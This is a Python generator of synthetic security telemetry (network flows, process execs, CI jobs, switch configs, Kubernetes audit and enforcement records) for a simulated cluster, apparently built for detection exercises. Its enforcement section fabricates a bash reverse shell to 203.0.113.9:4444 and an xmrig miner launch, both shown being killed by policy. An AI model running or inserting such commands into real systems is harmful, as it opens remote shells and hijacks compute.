"""Daily background schedule with exact counts (generating prompt section 7.3).

Every shaped stream has a fixed daily total distributed over the 1,440 minutes of the UTC day by largest-remainder
rounding of a business-hours weight profile (local time zone), so any 24-hour window ending at a minute boundary
holds exactly the daily totals. Content sequences are deterministic and repeat every day; only timestamps move.
"""
import datetime as dt
import hashlib
import random
from collections import OrderedDict

from . import SEED, canon, builders as B
from .estate import KNOWN_GAPS, finding_id_for

DAY = 86400
TOTALS = OrderedDict([("protected", 13706), ("other_egress", 55000), ("dropped", 1400), ("exec", 12000), ("ci_jobs", 1400)])


def _rng(*parts):
    return random.Random(hashlib.sha256((SEED + "|" + "|".join(str(p) for p in parts)).encode()).hexdigest())


def _u(*parts):
    """Deterministic float in [0,1)."""
    return int(hashlib.sha256((SEED + "|" + "|".join(str(p) for p in parts)).encode()).hexdigest()[:12], 16) / float(16 ** 12)


def _tz(name):
    try:
        from zoneinfo import ZoneInfo
        return ZoneInfo(name)
    except Exception:  # noqa: BLE001
        return dt.timezone(dt.timedelta(hours=-4))


def minute_weights(day_number, tz_name="America/New_York"):
    """Weight per UTC minute of the day: 1.0 between 08:00 and 20:00 local, 0.3 at night, with soft edges."""
    tz = _tz(tz_name)
    base = dt.datetime(1970, 1, 1, tzinfo=dt.timezone.utc) + dt.timedelta(days=day_number)
    out = []
    for m in range(1440):
        local = (base + dt.timedelta(minutes=m)).astimezone(tz)
        h = local.hour + local.minute / 60.0
        if 8.0 <= h < 20.0:
            w = 1.0
        elif 7.0 <= h < 8.0:
            w = 0.3 + 0.7 * (h - 7.0)
        elif 20.0 <= h < 21.0:
            w = 1.0 - 0.7 * (h - 20.0)
        else:
            w = 0.3
        out.append(w)
    return out


def _largest_remainder(weights, total):
    s = float(sum(weights))
    raw = [w * total / s for w in weights]
    base = [int(x) for x in raw]
    order = sorted(range(len(raw)), key=lambda i: (raw[i] - base[i], -i), reverse=True)
    for i in order[:total - sum(base)]:
        base[i] += 1
    return base


_COUNT_CACHE = {}


def minute_counts(stream, day_number, tz_name="America/New_York"):
    key = (stream, day_number, tz_name)
    if key not in _COUNT_CACHE:
        counts = _largest_remainder(minute_weights(day_number, tz_name), TOTALS[stream])
        prefix = [0]
        for c in counts:
            prefix.append(prefix[-1] + c)
        _COUNT_CACHE[key] = (counts, prefix)
    return _COUNT_CACHE[key]


# --------------------------------------------------------------------------- content sequences (repeat daily)
_SEQ = {}


def _seq(name, builder):
    if name not in _SEQ:
        _SEQ[name] = builder()
    return _SEQ[name]


def protected_sequence(estate):
    def build():
        seq = []
        for i, key in enumerate(estate.paths):
            seq.extend([i] * estate.paths[key]["count"])
        _rng("seq", "protected").shuffle(seq)
        assert len(seq) == TOTALS["protected"]
        return seq
    return _seq("protected", build)


def other_egress_sequence(estate):
    def build():
        keys = list(estate.workloads)
        rng = _rng("seq", "other_egress")
        seq = list(range(len(keys))) + [rng.randrange(len(keys)) for _ in range(TOTALS["other_egress"] - len(keys))]
        rng.shuffle(seq)
        return seq
    return _seq("other_egress", build)


ARGS_BY_PROGRAM = {
    "/usr/bin/python3.11": "-m ztrain.ckpt --sync --job {job}", "/opt/vllm/bin/python3.11": "-m vllm.entrypoints.api_server --model-fetch",
    "/opt/venv/bin/python3.11": "-m app.worker --pull", "/usr/local/bin/envoy": "-c /etc/envoy/envoy.yaml", "/usr/local/bin/model-loader": "--registry https://model-registry.ai-infer.svc",
    "/usr/local/bin/warm-pool": "--refresh", "/usr/local/bin/canaryd": "--compare", "/usr/local/bin/probe": "--target model-registry", "/opt/java/bin/java": "-jar /opt/app/app.jar",
    "/usr/local/bin/node": "/app/server.js", "/usr/local/bin/redis-server": "/etc/redis/redis.conf", "/opt/erp/bin/sync": "--models --nightly",
    "/usr/bin/restic": "backup /data --repo s3:backup", "/opt/conda/bin/python": "-m ipykernel_launcher -f /tmp/kernel.json", "/usr/local/bin/argocd": "app sync ml-models",
    "/usr/bin/fluent-bit": "-c /fluent-bit/etc/fluent-bit.conf",
}
EGRESS_POLICY_REV = {"build-farm": 41, "ai-train": 57, "ai-infer": 88, "platform": 120, "data-eng": 66, "vm-legacy": 12, "ml-notebooks": 33, "observability": 29}


def egress_policy(ns):
    return [B.policy_ref("%s-egress-internal" % ns, ns, EGRESS_POLICY_REV.get(ns, 5))]


def gen_protected(estate, k, t):
    """One protected-path connection: Tetragon connect at t, egress FORWARDED at t+7ms, ingress at t+29ms."""
    src, dest, port = list(estate.paths)[protected_sequence(estate)[k]]
    info = estate.paths[(src, dest, port)]
    sp = estate.workloads[src].pods[0]
    dp = estate.workloads[dest].pods[-1]  # the store pod on the canonical node
    src_port = 30000 + int(_u("sport", k) * 30000)
    pid = 1000 + int(_u("pid", k) * 60000)
    node = sp.node
    parent = B.tetragon_process(estate, sp, "/usr/bin/tini", "-- /entrypoint.sh", 1, t - 3600 - int(_u("pstart", src) * 40000), node, uid=0, cwd="/", full=False)
    prog = B.tetragon_process(estate, sp, info["program"], ARGS_BY_PROGRAM.get(info["program"], "").format(job=7690 + k % 30), pid, t - 0.2 - _u("pst", k) * 5, node,
                              parent=parent, uid=1000 if src.split("/")[0] != "platform" else 0, cwd="/app", container_name="main")
    yield B.tetragon_connect(estate, t, node, prog, parent, sp.ip, src_port, dp, port)
    yield B.hubble_flow(estate, t + 0.007, sp, dp, port, src_port, "FORWARDED", "EGRESS", node, allowed_by=egress_policy(sp.workload.split("/")[0]), policy_match_type=2)
    if info["enforced"]:
        yield B.hubble_flow(estate, t + 0.029, sp, dp, port, src_port, "FORWARDED", "INGRESS", dp.node, allowed_by=[B.policy_ref(info["policy"], dest.split("/")[0], 12)], policy_match_type=2)
    else:
        yield B.hubble_flow(estate, t + 0.029, sp, dp, port, src_port, "AUDIT", "INGRESS", dp.node, policy_match_type=0)


SERVICES = [("platform/dns", 53, "UDP"), ("platform/ingress", 443, "TCP"), ("observability/otel-collector", 4317, "TCP"), ("platform/harbor-core", 443, "TCP"),
            ("data-eng/kafka-connect", 9092, "TCP"), ("ai-infer/api-gateway", 443, "TCP"), ("platform/vault-agent-injector", 8200, "TCP"), ("observability/prometheus", 9090, "TCP"),
            ("platform/s3-gateway", 443, "TCP"), ("platform/oidc-proxy", 443, "TCP")]


def gen_other_egress(estate, k, t):
    keys = list(estate.workloads)
    src = estate.workloads[keys[other_egress_sequence(estate)[k]]]
    sp = src.pods[int(_u("rep", k) * len(src.pods))]
    u = _u("dest", k)
    if u < 0.65:
        dkey, port, proto = SERVICES[int(_u("svc", k) * len(SERVICES))]
    else:
        same = [w for w in (keys[int(_u("peer", k, i) * len(keys))] for i in range(6)) if w.split("/")[0] == src.namespace and w != src.key]
        dkey, port, proto = (same[0] if same else "platform/dns"), (8080 if same else 53), ("TCP" if same else "UDP")
    if dkey in canon.STORE_WORKLOAD or dkey in estate.stores:
        dkey, port, proto = "platform/dns", 53, "UDP"
    dp = estate.workloads[dkey].pods[0]
    src_port = 32768 + int(_u("osport", k) * 28000)
    reply = _u("reply", k) < 0.25
    yield B.hubble_flow(estate, t, sp, dp, port, src_port, "FORWARDED", "EGRESS", sp.node, reply=reply, protocol=proto)


def gen_dropped(estate, k, t):
    teams = [w for w in estate.workloads if w.startswith("team-")]
    a = estate.workloads[teams[int(_u("da", k) * len(teams))]]
    b_choices = [teams[int(_u("db", k, i) * len(teams))] for i in range(4)]
    bkey = next((x for x in b_choices if x.split("/")[0] != a.namespace), teams[0])
    b = estate.workloads[bkey]
    sp, dp = a.pods[0], b.pods[0]
    src_port = 40000 + int(_u("dsport", k) * 20000)
    yield B.hubble_flow(estate, t, sp, dp, 8080, src_port, "DROPPED", "EGRESS", sp.node, drop_reason=133, drop_desc="POLICY_DENIED")


EXEC_BINARIES = {"default": [("/usr/bin/python3.11", "-m app.task"), ("/bin/sh", "-c /app/healthcheck.sh"), ("/usr/bin/cat", "/proc/self/cgroup"), ("/usr/local/bin/node", "/app/worker.js"),
                             ("/usr/bin/env", "sh -c /app/run.sh"), ("/bin/busybox", "sh /app/hook.sh"), ("/usr/bin/id", "-u"), ("/usr/local/bin/gunicorn", "app:app --workers 4")],
                 "build-farm": [("/usr/bin/git", "fetch --depth 50 origin"), ("/usr/bin/make", "-j8 build"), ("/usr/bin/python3.11", "-m pytest -q"), ("/usr/local/bin/go", "build ./..."),
                                ("/bin/sh", "-c ./scripts/build.sh"), ("/usr/bin/npm", "ci"), ("/usr/bin/docker", "buildx build ."), ("/usr/bin/tar", "-czf artifacts.tgz dist")],
                 "ml-notebooks": [("/opt/conda/bin/python", "-m ipykernel_launcher -f /tmp/kernel.json"), ("/bin/bash", "-c pip list"), ("/opt/conda/bin/jupyter", "lab --no-browser"),
                                  ("/usr/bin/git", "status"), ("/opt/conda/bin/python", "-c import torch")],
                 "ai-train": [("/usr/bin/python3.11", "-m torch.distributed.run train.py"), ("/usr/bin/nvidia-smi", "-q"), ("/bin/sh", "-c /app/prestart.sh"), ("/usr/bin/python3.11", "-m ztrain.eval")]}


def gen_exec(estate, k, t):
    keys = list(estate.workloads)
    w = estate.workloads[keys[int(_u("ex", k) * len(keys))]]
    p = w.pods[int(_u("exrep", k) * len(w.pods))]
    choices = EXEC_BINARIES.get(w.namespace, EXEC_BINARIES["default"])
    binary, args = choices[int(_u("exbin", k) * len(choices))]
    if p.name == canon.RUNNER_POD and "curl" in binary:
        binary, args = "/usr/bin/git", "status"
    pid = 500 + int(_u("expid", k) * 60000)
    parent = B.tetragon_process(estate, p, "/usr/bin/tini", "-- /entrypoint.sh", 1, t - 7200 - int(_u("expstart", w.key) * 40000), p.node, uid=0, cwd="/", full=False)
    proc = B.tetragon_process(estate, p, binary, args, pid, t, p.node, parent=parent, uid=1000, cwd="/app" if w.namespace != "build-farm" else "/builds/" + PROJECTS[k % len(PROJECTS)][0],
                              container_name="build" if w.namespace == "build-farm" else "main")
    yield B.tetragon_exec(estate, t, p.node, proc, parent)


PROJECTS = [("ml-infra/train-utils", 1187), ("ml-infra/eval-suite", 1188), ("ml-infra/data-tools", 1190), ("platform/gitops", 402), ("platform/images", 405),
            ("serving/router", 2201), ("serving/embed", 2203), ("serving/guardrails", 2207), ("data-eng/pipelines", 3310), ("data-eng/dbt-models", 3312),
            ("apps/team-012-api", 5012), ("apps/team-044-web", 5044), ("apps/team-097-api", 5097), ("apps/team-118-cron", 5118), ("legacy/erp-jobs", 900),
            ("notebooks/research-kernels", 6001), ("o11y/collectors", 7001), ("security/policies", 8001), ("ml-infra/ckpt-tools", 1191), ("serving/vector-index", 2210)]
JOB_NAMES = [("build", "build"), ("unit-test", "test"), ("lint", "test"), ("package", "post-build"), ("integration-test", "test"), ("publish", "deploy"), ("scan", "post-build")]
DEVS = ["dev-%02d" % i for i in range(1, 41)] + ["contractor-dev-17", "contractor-dev-22", "release-bot"]


def gen_ci_job(estate, k, t, day_number):
    """2 or 3 events for one background CI job, all emitted at their own times relative to t (the job start)."""
    proj, pid_ = PROJECTS[int(_u("cip", k) * len(PROJECTS))]
    name, stage = JOB_NAMES[int(_u("cin", k) * len(JOB_NAMES))]
    runner_pods = estate.workloads[canon.RUNNER_WORKLOAD].pods
    rp = runner_pods[int(_u("cir", k) * len(runner_pods))]
    job_id = 200000 + (day_number - 20700) * 1400 + k
    pipeline = 40000 + (day_number - 20700) * 300 + k // 5
    dev = DEVS[int(_u("cid", k) * len(DEVS))]
    sha = hashlib.sha1(("%s%d" % (SEED, job_id)).encode()).hexdigest()
    dur = 40 + int(_u("cidur", k) * 900)
    failed = _u("cifail", k) < 0.07
    three = _u("ci3", k) < 0.4
    created = t - 9
    common = dict(build_id=job_id, name=name, stage=stage, created_at=created, started_at=t, pipeline_id=pipeline, project_id=pid_, project_path=proj,
                  project_name=proj.replace("/", " / "), user=dev, sha=sha, commit_message="%s: update %s" % (name, proj.split("/")[-1]), runner_id=300 + runner_pods.index(rp),
                  runner_pod=rp.name, ref="main" if _u("ciref", k) < 0.6 else "feature/%s-%d" % (name, k % 97))
    if three:
        c2 = dict(common)
        c2["started_at"] = None
        yield B.ci_job_event(created, status="pending", **c2)
    yield B.ci_job_event(t, status="running", **common)
    yield B.ci_job_event(t + dur, status="failed" if failed else "success", finished_at=t + dur, duration=dur, failure_reason="script_failure" if failed else None, **common)


# --------------------------------------------------------------------------- fixed-time streams
LIVEPROTECT = [("01:10:00", "dc2-leaf-201", "NX-LP-0007", "nxos-bgp"), ("05:10:00", "dc2-leaf-203", "NX-LP-0009", "nxos-lldp"), ("09:10:00", "dc2-leaf-205", "NX-LP-0007", "nxos-bgp"),
               ("13:10:00", "dc2-leaf-207", "NX-LP-0011", "nxos-snmp"), ("17:10:00", "dc2-leaf-202", "NX-LP-0009", "nxos-lldp"), ("21:10:00", "dc2-leaf-208", "NX-LP-0012", "nxos-ssh")]
NEXUS_ROUTINE = [("00:20:11", "dc2-leaf-204", "netops-automation", "interface Eth1/31 description gen-node-17", "+ description gen-node-17"),
                 ("03:45:52", "dc2-leaf-201", "a.patel", "vlan 214 name k8s-ai-stor", "+ vlan 214\n+ name k8s-ai-stor"),
                 ("08:15:37", "dc2-leaf-206", "netops-automation", "router bgp 65002 neighbor 10.40.19.44 update-source loopback0", "+ neighbor 10.40.19.44"),
                 ("12:40:05", "dc2-leaf-203", "a.patel", "ip prefix-list k8s-pods seq 40 permit 10.42.24.0/24", "+ seq 40 permit 10.42.24.0/24"),
                 ("16:05:48", "dc2-leaf-208", "netops-automation", "interface Eth1/26 mtu 9216", "- mtu 1500\n+ mtu 9216"),
                 ("21:50:19", "dc2-leaf-202", "a.patel", "snmp-server host 10.40.5.10 traps version 2c", "+ snmp-server host 10.40.5.10")]
ROUTINE_K8S_USERS = [("system:serviceaccount:argocd:argocd-application-controller", ["system:serviceaccounts", "system:serviceaccounts:argocd", "system:authenticated"], "10.42.10.14", "argocd-application-controller/v2.12", B.ARGOCD_REASON),
                     ("k.osei", ["platform-admins", "system:authenticated"], "10.40.2.44", "kubectl/v1.31.2", B.PLATFORM_REASON)]


def _tod(s):
    h, m, sec = (int(x) for x in s.split(":"))
    return h * 3600 + m * 60 + sec


def gen_fixed(estate, day_number, start, end):
    """Events of the fixed daily schedule with start < t <= end within this UTC day."""
    day_start = day_number * DAY

    def within(t):
        return start < t <= end

    # Nexus endpoint snapshots, hourly per node (each node 50 ms apart)
    for hour in range(24):
        snap = day_start + hour * 3600
        if start < snap + 5 and snap - 1 <= end:
            for i, node in enumerate(estate.nodes.values()):
                t = snap + i * 0.05
                if within(t):
                    yield B.nexus_endpoint(t, node, snap)
    for tod, sw, adv, comp in LIVEPROTECT:
        t = day_start + _tod(tod)
        if within(t):
            yield B.nexus_liveprotect(t, sw, adv, comp)
    for tod, dev, user, change, diff in NEXUS_ROUTINE:
        t = day_start + _tod(tod)
        if within(t):
            yield B.nexus_config(t, dev, user, change, diff, ticket="CHG-%d" % (40000 + day_number % 1000))
    # routine Kubernetes audit: 24 per day at hh:17:23
    for hour in range(24):
        t = day_start + hour * 3600 + 17 * 60 + 23
        if within(t):
            user, groups, ip, ua, reason = ROUTINE_K8S_USERS[0 if hour % 4 else 1]
            res = ["ciliumnetworkpolicies", "deployments", "configmaps", "services"][hour % 4]
            ns = ["ai-infer", "platform", "data-eng", "team-%03d" % (hour * 5 + 1)][hour % 4]
            grp, ver = ("cilium.io", "v2") if res == "ciliumnetworkpolicies" else ("apps", "v1") if res == "deployments" else ("", "v1")
            yield B.k8s_audit(t, audit_id=B.det_uuid("k8s", day_number, hour), verb="update" if hour % 3 else "create", uri="/apis/%s/%s/namespaces/%s/%s/%s" % (grp, ver, ns, res, "app-%d" % hour) if grp else "/api/v1/namespaces/%s/%s/app-%d" % (ns, res, hour),
                              resource=res, namespace=ns, name="app-%d" % hour if res != "ciliumnetworkpolicies" else "%s-egress-internal" % ns, api_group=grp, api_version=ver, code=200 if hour % 3 else 201,
                              user=user, groups=groups, source_ip=ip, user_agent=ua, reason=reason)
    # enforcement history: 16 actions with 4 states each and the matching platform event
    for si, slot in enumerate(estate.enforcement_slots):
        T = day_start + slot["tod"]
        fid = finding_id_for(day_number, slot)
        date = dt.datetime.fromtimestamp(day_start, dt.timezone.utc).strftime("%Y%m%d")
        req_id = "ZTR-%s-%04d" % (date, si + 1)
        inv_id = "INV-%d" % (int(fid.split("-")[1]) - 300)
        wl = slot["target"]
        pod = estate.workloads[wl].pods[0]
        job_suffix = slot["action"].split("-")[-1] if slot["platform"] == "cnp" else ""
        policy = {"cnp": "zt-quarantine-%s-%s" % (wl.split("/")[1], job_suffix), "cnp-update": estate.stores.get(wl, {}).get("allowlist_policy", "%s-ingress-allowlist" % wl.split("/")[1]),
                  "sigkill": "tetragon-enforce-%s" % wl.split("/")[1], "dpu": "hs-dpu-egress-%s" % wl.split("/")[1], "nexus": "nexus-%s" % slot["action"].split(":")[0].lower().replace(" ", "-")}[slot["platform"]]
        playbook = canon.PLAYBOOK if slot["point"] == "kernel" else "zt_enforce_fabric"
        run_id = str(3000 + (day_number - 20700) * 40 + si)
        approved_at = T - 2
        audit_ids = []
        if slot["platform"] == "cnp":
            audit_ids = [B.det_uuid("k8spatch", day_number, si), B.det_uuid("k8scnp", day_number, si)]
        elif slot["platform"] == "cnp-update":
            audit_ids = [B.det_uuid("k8supd", day_number, si)]
        common = dict(request_id=req_id, finding_id=fid, investigation_id=inv_id, enforcement_point=slot["point"], action=slot["action"], target="%s/%s" % (wl.split("/")[0], pod.name),
                      workload=wl, policy_name=policy, approved_by=slot["approved_by"], approver_role=slot["approver_role"], approved_at=approved_at, executed_by="soar", playbook=playbook,
                      run_id=run_id, k8s_audit_ids=audit_ids, comment=slot["comment"])
        for state, off in (("requested", -95), ("approved", -2), ("applied", 0), ("verified", 45)):
            t = T + off
            if within(t):
                yield B.enforcement_audit(t, state=state, **common)
        if within(T) or within(T - 0.4):
            if slot["platform"] in ("cnp", "cnp-update"):
                is_update = slot["platform"] == "cnp-update"
                user, groups, ip, ua, reason = ("k.osei", ["platform-admins", "system:authenticated"], "10.40.2.44", "kubectl/v1.31.2", B.PLATFORM_REASON) if is_update else \
                    (canon.ENFORCER_USER, canon.ENFORCER_GROUPS, canon.ENFORCER_SOURCE_IP, "zt-quarantine-workload/1.0", B.ENFORCER_REASON)
                if not is_update:
                    yield B.k8s_audit(T - 0.4, audit_id=audit_ids[0], verb="patch", uri="/api/v1/namespaces/%s/pods/%s" % (wl.split("/")[0], pod.name), resource="pods", namespace=wl.split("/")[0], name=pod.name,
                                      api_group="", api_version="v1", code=200, user=user, groups=groups, source_ip=ip, user_agent=ua, reason=reason)
                yield B.k8s_audit(T, audit_id=audit_ids[-1], verb="update" if is_update else "create",
                                  uri="/apis/cilium.io/v2/namespaces/%s/ciliumnetworkpolicies%s" % (wl.split("/")[0], "/" + policy if is_update else ""), resource="ciliumnetworkpolicies",
                                  namespace=wl.split("/")[0], name=policy, api_group="cilium.io", api_version="v2", code=200 if is_update else 201, user=user, groups=groups, source_ip=ip, user_agent=ua, reason=reason)
            elif slot["platform"] == "sigkill":
                parent = B.tetragon_process(estate, pod, "/usr/bin/tini", "-- /entrypoint.sh", 1, T - 9000, pod.node, uid=0, cwd="/", full=False)
                binary = "/tmp/.x/xmrig" if "miner" in slot["comment"] else "/bin/bash"
                proc = B.tetragon_process(estate, pod, binary, "-o pool.invalid:3333" if "miner" in slot["comment"] else "-i >& /dev/tcp/203.0.113.9/4444 0>&1", 7000 + si, T - 0.01, pod.node, parent=parent, uid=1000, cwd="/tmp")
                yield B.tetragon_kprobe_sigkill(estate, T, pod.node, proc, parent, "block-unapproved-binaries" if "miner" in slot["comment"] else "block-reverse-shell")
            elif slot["platform"] == "nexus":
                node = estate.nodes[pod.node]
                change = {"Hypershield deny: legacy → ai": "hypershield policy deny segment legacy to segment ai", "Nexus ACL update: tenant probe": "ip access-list zt-tenant-probe deny ip %s/32 any" % pod.ip,
                          "Nexus shut Eth1/7": "interface Eth1/7 shutdown", "Hypershield deny: tenant probe": "hypershield policy deny segment team-003 to segment observability"}[slot["action"]]
                yield B.nexus_config(T, node.switch if "Eth1/7" not in slot["action"] else "dc2-leaf-203", "soar-nxapi", change, "+ " + change, ticket=fid)


# --------------------------------------------------------------------------- windows
LOOKBACK = {"protected": 1, "other_egress": 1, "dropped": 1, "exec": 1, "ci_jobs": 1000}
LOOKAHEAD = {"protected": 0, "other_egress": 0, "dropped": 0, "exec": 0, "ci_jobs": 10}


def background_events(estate, start, end, tz_name="America/New_York"):
    """Yield every background event with start < t <= end (epoch seconds). Items that span several events
    (a connection's three records, a CI job's two or three events) are scanned with a lookback and filtered per event,
    so every event is emitted exactly once whatever the tick boundaries."""
    B.set_zones(estate)
    gens = {"protected": gen_protected, "other_egress": gen_other_egress, "dropped": gen_dropped, "exec": gen_exec}
    for stream in TOTALS:
        scan_start = start - LOOKBACK[stream]
        for day in range(int(scan_start // DAY), int(end // DAY) + 1):
            day_start = day * DAY
            counts, prefix = minute_counts(stream, day, tz_name)
            m0 = max(0, int((scan_start - day_start) // 60))
            m1 = min(1439, int((end + LOOKAHEAD[stream] - day_start) // 60))
            for m in range(m0, m1 + 1):
                for j in range(counts[m]):
                    k = prefix[m] + j
                    t = day_start + m * 60 + _u("t", stream, m, j) * 60
                    if t - LOOKAHEAD[stream] > end or t + LOOKBACK[stream] <= start:
                        continue
                    evs = gen_ci_job(estate, k, t, day) if stream == "ci_jobs" else gens[stream](estate, k, t)
                    for ev in evs:
                        if start < ev["time"] <= end:
                            yield ev
    for day in range(int((start - 120) // DAY), int(end // DAY) + 1):
        for ev in gen_fixed(estate, day, start, end):
            if start < ev["time"] <= end:
                yield ev


def daily_expectations():
    """Expected counts per sourcetype per 24 hours (for smoke tests)."""
    return OrderedDict([("cilium:hubble:flow", 13706 * 2 + 55000 + 1400), ("cisco:isovalent:processConnect", 13706), ("cisco:isovalent:processExec", 12000),
                        ("cisco:isovalent", 2), ("ci:job:event", None), ("cisco:nexus:endpoint", 2208), ("cisco:nexus:liveprotect", 6), ("cisco:nexus:config", 10),
                        ("kube:apiserver:audit", 24 + 5 * 2 + 3), ("zt:enforcement:audit", 64)])
